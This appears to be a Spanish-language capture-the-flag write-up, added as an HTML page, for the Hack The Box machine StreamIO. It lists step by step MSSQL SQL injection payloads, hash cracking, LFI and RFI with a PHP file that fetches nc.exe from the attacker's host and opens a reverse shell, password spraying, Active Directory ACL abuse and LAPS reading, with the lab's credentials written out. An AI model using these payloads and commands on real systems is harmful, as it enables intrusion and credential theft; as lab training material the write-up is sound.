@@ -1,0 +1,345 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | StreamIO HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/streamio/pasted-20260324214204.png" alt="StreamIO HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>StreamIO</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>fuzzing</span>
+            <span>gobuster</span>
+            <span>vhosts</span>
+            <span>sqli_MSSQL</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Fuzzing de directorios, PHP, vhosts y parámetros LFI</li>
+            <li><code>Explotación</code>: SQLI en MSSQL permite obtener credenciales de la web</li>
+            <li><code>Explotación</code>: LFI/RFI con wrapper PHP y función <code>eval</code> para obtener shell</li>
+            <li><code>Movimiento lateral</code>: <code>sqlcmd</code> revela la BD <code>streamio_backup</code> con nuevas credenciales</li>
+            <li><code>Movimiento lateral</code>: Credenciales almacenadas en Firefox</li>
+            <li><code>Escalada de Privilegios</code>: ACL WriteOwner y lectura de LAPS para obtener credenciales privilegiadas</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260324233745.png" alt="StreamIO HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Fuzzing de Directorios</h2>
+          <div class="code-card">
+            <h3>Fuzzing de Directorios</h3>
+            <pre><code>gobuster dir -u https://streamio.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50 -k
+# /admin</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327165037.png" alt="StreamIO HTB" />
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327165240.png" alt="StreamIO HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Fuzzing de Archivos del Directorio /admin</h2>
+          <div class="code-card">
+            <h3>Fuzzing de Archivos PHP</h3>
+            <pre><code>gobuster dir -u https://streamio.htb/admin -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50 -k -x php
+# master.php</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327165156.png" alt="StreamIO HTB" />
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327165255.png" alt="StreamIO HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Fuzzing de Dominios</h2>
+          <div class="code-card">
+            <h3>Fuzzing de SubDominios</h3>
+            <pre><code>ffuf -u "https://dc" -H "Host: FUZZ.streamIO.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50
+# Alternativa
+gobuster vhost -u https://dc -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --domain streamIO.htb --append-domain -k
+# Dominio: watch.streamIO.htb</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260324234016.png" alt="StreamIO HTB" />
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260324235946.png" alt="StreamIO HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Fuzzing de Archivos del VHOST</h2>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327153630.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Fuzzing SSL</h3>
+            <pre><code>gobuster dir -u https://watch.streamio.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 70 -x php -k
+# search.php</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327153818.png" alt="StreamIO HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: SQLI</h2>
+          <div class="code-card">
+            <h3>Interpretar sentencia SQL</h3>
+            <pre><code># Input: man
+# Output: Imprime cualquier coincidencia con el input  %input%
+
+# Posible Sentencia SQL
+select movie from movies where movie_name like '%man%'</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327154348.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Interpretar sentencia SQL</h3>
+            <pre><code># Forzar a imprimir solo movies que terminen en man
+
+# Input man'-- -
+select movie from movies where movie_name like '%man'-- -%'</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327154422.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Enumerar número de columnas</h3>
+            <pre><code># SQLi en Windows suele aplicar MSSQL
+# Input: test'order by 10-- -
+# Detecta actividad maliciosa con la cadena: order incluso alternando mayúsculas y minúsuculas</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327154819.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Enumerar número de columnas</h3>
+            <pre><code># Input: test'union select 1-- -
+# Input: test'union select 1,2-- -
+# Input: test'union select 1,2,3,4,5,6-- -</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327155139.png" alt="StreamIO HTB" />
+          <p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">PayloadsSQLIMSSQL</a></p>
+          <div class="code-card">
+            <h3>Enumerar Versión MSSQL</h3>
+            <pre><code># Input: test'union select 1,@@version,3,4,5,6-- -</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327155233.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Nombre de la BD</h3>
+            <pre><code># Input: test'union select 1,db_name(),3,4,5,6-- -</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327160546.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Enumerar BDs</h3>
+            <pre><code># Input: tes'union select 1,name,id,4,5,6 FROM master..sysdatabases-- -</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327235805.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Enumerar tablas y su identificador</h3>
+            <pre><code># Input: test'union select 1,name,id,4,5,6 FROM STREAMIO..sysobjects WHERE xtype='U'-- -</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327161212.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Enumerar columnas de la tabla con id 901578250</h3>
+            <pre><code># Input: test'union select 1,name,3,4,5,6 FROM syscolumns WHERE id=901578250-- -</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327161252.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Enumerar username y password de la tabla users</h3>
+            <pre><code># Input: test'union select 1,concat(username,':',password),3,4,5,6 FROM users-- -</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327161611.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Formatear Credenciales</h3>
+            <pre><code>cat credenciales | grep : | tr -d ' ' | sponge hashes</code></pre>
+          </div>
+          <p><a href="https://hashes.com/en/tools/hash_identifier">Hash Identifier</a></p>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327162314.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Crackear hashes</h3>
+            <pre><code>john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327162352.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Validar usuarios con Kerbrute</h3>
+            <pre><code>kerbrute userenum  --dc 10.129.17.133 -d streamIO.htb  users</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327165417.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Alternativa: Fuerza Bruta con BurpSuite</h3>
+            <pre><code># Agregar Regex para filtrar por columna Login Failed</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327171331.png" alt="StreamIO HTB" />
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327171907.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Probar Credenciales en la Web</h3>
+            <pre><code># Credenciales -&gt; yoshihide:66boysandgirls..</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327165507.png" alt="StreamIO HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: LFI</h2>
+          <div class="code-card">
+            <h3>Ruta https://dc/admin/</h3>
+            <pre><code># Vemos que hay parámetros para probar LFI. Fuzzing de parámetros</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327165809.png" alt="StreamIO HTB" />
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327165900.png" alt="StreamIO HTB" />
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327165844.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Fuzzing de Parámetros arrastrando Cookie de Sesión, -k para SSL, -xl para evitar respuestas de ese tamaño</h3>
+            <pre><code>gobuster fuzz -u "https://streamio.htb/admin/?FUZZ=" -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50 -k -H "Cookie: PHPSESSID=vkskk0c03deeqk4j3l2gaechn7" -xl 1678</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327172656.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>LFI</h3>
+            <pre><code># https://streamio.htb/admin/?debug=\Windows\System32\drivers\etc\hosts
+curl -k -H "Cookie: PHPSESSID=vkskk0c03deeqk4j3l2gaechn7" "https://streamio.htb/admin/?debug=\Windows\System32\drivers\etc\hosts"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260327173148.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Wrapper php leer index.php</h3>
+            <pre><code>curl -k -H "Cookie: PHPSESSID=vkskk0c03deeqk4j3l2gaechn7" "https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328000811.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Decodificar</h3>
+            <pre><code>echo '&lt;cadena&gt;' | base64 -d &gt; index.php
+# Credenciales -&gt; db_admin:B1@hx31234567890</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328000937.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Wrapper php leer master.php</h3>
+            <pre><code>curl -k -H "Cookie: PHPSESSID=vkskk0c03deeqk4j3l2gaechn7" "https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328000811.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Decodificar</h3>
+            <pre><code>echo '&lt;cadena&gt;' | base64 -d &gt; master.php</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328001154.png" alt="StreamIO HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: RFI</h2>
+          <div class="code-card">
+            <h3>Interceptamos petición</h3>
+            <pre><code># URL: https://streamio.htb/admin/?debug=master.php</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328005743.png" alt="StreamIO HTB" />
+          <p><a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md">Rutas AppLockerByPass</a></p>
+          <div class="code-card">
+            <h3>rce.php -&gt; Descargar nc.exe</h3>
+            <pre><code>system("certutil -urlcache -f http://10.10.16.69/nc.exe C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe");</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328011234.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Hostear rce.php y nc.exe</h3>
+            <pre><code>python -m http.server 80</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328011221.png" alt="StreamIO HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Acceso Sistema RFI</h2>
+          <div class="code-card">
+            <h3>rce.php -&gt; Reverse shell</h3>
+            <pre><code>system("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe 10.10.16.69 443 -e cmd");</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328011311.png" alt="StreamIO HTB" />
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328011444.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Alternativa a Burpsuite</h3>
+            <pre><code>curl --insecure -b "PHPSESSID=n4cdkptkj1c7sbec67a54p1tdu" -X POST --data "include=http://10.10.16.69/rce.php" https://streamio.htb/admin/index.php\?debug\=master.php</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Enumerar BD del backup para obtener nuevas credenciales</h2>
+          <div class="code-card">
+            <h3>Comprobar si tiene la herramienta sqlcmd instalada</h3>
+            <pre><code>sqlcmd -?</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Enumerar BD streamio_backup (No se pudo enumerar desde SQLi porque el usuario que ejecutaban la BD STREAMIO en uso no tenía permisos para enumerar está BD)</h3>
+            <pre><code>sqlcmd -U db_admin -P 'B1@hx31234567890' -S localhost -d streamio_backup -Q "SELECT name FROM streamio_backup..sysobjects WHERE xtype= 'U';"
+# Credenciales index.php -&gt; db_admin:B1@hx31234567890</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328012823.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Enumerar la tabla users</h3>
+            <pre><code>sqlcmd -U db_admin -P 'B1@hx31234567890' -S localhost -d streamio_backup -Q "SELECT * FROM users;"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328012953.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Credenciales</h3>
+            <pre><code># Validar Usuarios
+kerbrute userenum  --dc 10.129.17.133 -d streamIO.htb  users
+# Crackear Contraseñas MD5 
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes
+# Password Spray
+nxc SMB 10.129.17.133 -u users -p 'get_dem_girls2@yahoo.com' --continue-on-success
+# Credenciales -&gt; nikk37:get_dem_girls2@yahoo.com</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328013435.png" alt="StreamIO HTB" />
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328013511.png" alt="StreamIO HTB" />
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328013524.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Acceso WINRM</h3>
+            <pre><code>evil-winrm -i dc -u nikk37 -p 'get_dem_girls2@yahoo.com'</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Credenciales Firefox Almacenadas</h2>
+          <div class="code-card">
+            <h3>Acceso WINRM</h3>
+            <pre><code>evil-winrm -i dc -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>BloodHound</h3>
+            <pre><code>bloodhound-python -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns  10.129.17.133 -d streamIO.htb -c all</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328024522.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code># Hacernos dueño del grupo (Ya lo eramos)
+bloodyAD --host dc.streamIO.htb --dc-ip 10.129.17.133 -d streamIO.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' set owner 'CORE STAFF' 'JDgodd'
+
+# Darnos Permisos
+bloodyAD --host dc.streamIO.htb --dc-ip 10.129.17.133 -d streamIO.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' add genericAll 'CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb' 'JDgodd'
+
+# Agregarnos al Grupo
+bloodyAD -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -d streamIO.htb --host 10.129.17.133 add groupMember 'CORE STAFF' 'JDgodd'</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328024547.png" alt="StreamIO HTB" />
+          <div class="code-card">
+            <h3>Leer contraseña de Local Admin con LAPS</h3>
+            <pre><code>nxc SMB 10.129.17.133 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps
+# Credenciales -&gt; administrator:6X++(o+Xx47v50</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/streamio/pasted-20260328025954.png" alt="StreamIO HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>fuzzing</span>
+            <span>gobuster</span>
+            <span>vhosts</span>
+            <span>sqli_MSSQL</span>
+            <span>sqli</span>
+            <span>MSSQL</span>
+            <span>lfi</span>
+            <span>rfi</span>
+            <span>eval</span>
+            <span>wrappers</span>
+            <span>acl</span>
+            <span>WriteOwner</span>
+            <span>ReadLAPSPassword</span>
+            <span>sqlcmd</span>
+            <span>curl</span>
+            <span>rutas_windows_permiso</span>
+          </div>
+        </section>
+          <p><a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md">Rutas AppLockerByPass</a></p>
+      </article>
+    </main>
+  </body>
+</html>
